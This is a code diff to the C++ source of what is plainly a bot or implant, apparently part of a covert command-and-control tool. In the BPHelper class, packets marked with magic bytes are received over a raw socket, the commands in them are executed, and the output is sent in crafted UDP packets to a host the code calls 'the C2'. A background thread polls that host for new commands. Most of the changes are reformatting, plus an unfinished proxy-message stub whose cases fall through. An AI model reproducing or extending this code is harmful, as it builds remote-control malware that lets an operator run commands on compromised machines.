@@ -10,7 +10,7 @@ int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
     switch (eventInfo->bpHeader.header_type) {
         case 0x02: {
             // execute command then respond
-            //std::cout << "Received a Command to Execute" << std::endl;
+            // std::cout << "Received a Command to Execute" << std::endl;
 #if defined(_WIN32) || defined(WIN32)
             std::string del = " ";
             size_t found = rawCommand.find(del);
@@ -18,16 +18,14 @@ int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
             if (found != std::string::npos) {
                 cmd = rawCommand.substr(0, rawCommand.find(del));
                 arguments = rawCommand.substr(rawCommand.find(del), rawCommand.length() - 1);
-            }
-            else {
+            } else {
                 cmd = rawCommand;
                 arguments = "";
             }
             auto result = RunCommand(cmd, arguments);
             if (result->error) {
                 output = result->std_error;
-            }
-            else {
+            } else {
                 output = result->std_output;
             }
 #else
@@ -43,8 +41,7 @@ int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
             if (output.length() > sizeof(bp_response.data)) {
                 bp_response.data_len = htons(static_cast<uint16_t>(sizeof(bp_response.data)));
                 memcpy(bp_response.data, output.c_str(), sizeof(bp_response.data));
-            } 
-            else {
+            } else {
                 bp_response.data_len = htons(static_cast<uint16_t>(output.length()));
                 memcpy(bp_response.data, output.c_str(), output.length());
             }
@@ -57,21 +54,12 @@ int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
 
 #ifdef __unix__
             // Sending the command output to the C2
-            std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
-                                                      c2Ip,
-                                                      srcPort,
-                                                      dstPort,
-                                                      payload,
-                                                      rawSocket.getMac(),
-                                                      nextHopMac);
+            std::vector<uint8_t> req =
+                CraftUDPPacket(rawSocket.getIP(), c2Ip, srcPort, dstPort, payload, rawSocket.getMac(), nextHopMac);
 
 #else
             // Sending the command output to the C2
-            std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
-                c2Ip,
-                srcPort,
-                dstPort,
-                payload);
+            std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(), c2Ip, srcPort, dstPort, payload);
 
 #endif
 
@@ -82,14 +70,62 @@ int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
         }
         case 0x04: {
             // keep alive to eventually inform the bot if it needs to switch it's transmission method.
-            //std::cout << "Received a Keep Alive" << std::endl;
+            // std::cout << "Received a Keep Alive" << std::endl;
             if (eventInfo->bpKeepAlive.command_num == currentCmd) {
                 currentCmd++;
             }
             return 1;
         }
+        case 0x05: {
+            // TODO: Handle Proxy stuff
+            // Check the proxy type value
+            switch (eventInfo->bpProxy.msg_type) {
+                case 0x00: {
+                    // noop
+                    std::cout << "Proxy NOOP received!" << std::endl;
+                    return -1;
+                }
+                case 0x20: {
+                    // Proxy REQUEST message
+                    // Handle responding to PROXY REQUEST message here
+
+                    // This is where we will handle responding to proxy requests
+
+                    // If not cutoff from the server:
+                    // Respond via unicast to the request with the same session ID and information
+                }
+                case 0x30: {
+                    // Proxy RESPONSE message
+                    // Handle final setup of proxy session
+
+                    // This means someone is accepting our proxy request
+
+                    // Check to see if we are currently proxied
+                    // If not currently proxied:
+                    // Initiate the proxy session by responding to our Proxy with the information to proxy
+                }
+                case 0x40: {
+                    // Packet is intended for the server or is already part of an established proxy session
+                    // Not much to do here
+                }
+                case 0x50: {
+                    // PROXY END message
+
+                    // If we are currently proxied:
+                    // End the session by unsetting some global value
+
+                    // Otherwise:
+                    // Do nothing
+                }
+                default: {
+                    // Improper proxy message ID
+                    std::cout << "Improper proxy message ID" << std::endl;
+                    return -1;
+                }
+            }
+        }
         default: {
-            //std::cout << "Not a Command or Keep Alive" << std::endl;
+            // std::cout << "Not a Command or Keep Alive" << std::endl;
             return -1;
         }
     }
@@ -104,7 +140,6 @@ void BPHelper::requestAction() {
     bp_command_request_header.command_num = htonl(currentCmd);
     bp_command_request_header.host_ip = rawSocket.getIP();
 
-
     auto bp_header_ptr = reinterpret_cast<unsigned char *>(&bpHeader);
     auto bp_ptr = reinterpret_cast<unsigned char *>(&bp_command_request_header);
 
@@ -112,20 +147,11 @@ void BPHelper::requestAction() {
     payload.insert(payload.end(), bp_ptr, bp_ptr + sizeof(bp_command_request_header));
 
 #if defined(_WIN32) || defined(WIN32)
-    std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
-                                            c2Ip,
-                                            srcPort,
-                                            dstPort,
-                                            payload);
+    std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(), c2Ip, srcPort, dstPort, payload);
     rawSocket.send(req);
 #else
-    std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(),
-                                              c2Ip,
-                                              srcPort,
-                                              dstPort,
-                                              payload,
-                                              rawSocket.getMac(),
-                                              nextHopMac);
+    std::vector<uint8_t> req =
+        CraftUDPPacket(rawSocket.getIP(), c2Ip, srcPort, dstPort, payload, rawSocket.getMac(), nextHopMac);
     rawSocket.send(req);
 #endif
 }
@@ -151,7 +177,8 @@ void BPHelper::Receive() {
         if (!packet.empty()) {
             std::unique_ptr<PacketParse::info_t> info = PacketParse::parsePacket(packet);
 #ifdef __unix__
-            if (info->bpHeader.magic_bytes == PacketParse::MAGIC_BYTES && info->ipHeader.dst_addr == ntohl(rawSocket.getIP())){
+            if (info->bpHeader.magic_bytes == PacketParse::MAGIC_BYTES &&
+                info->ipHeader.dst_addr == ntohl(rawSocket.getIP())) {
                 actionResponse(move(info));
             }
 #elif defined(_WIN32) || defined(WIN32)
@@ -175,5 +202,3 @@ void BPHelper::requestActionThread() {
     std::thread t1(&BPHelper::requestActionLoop, this, requestActionInterval);
     t1.detach();
 }
-
-
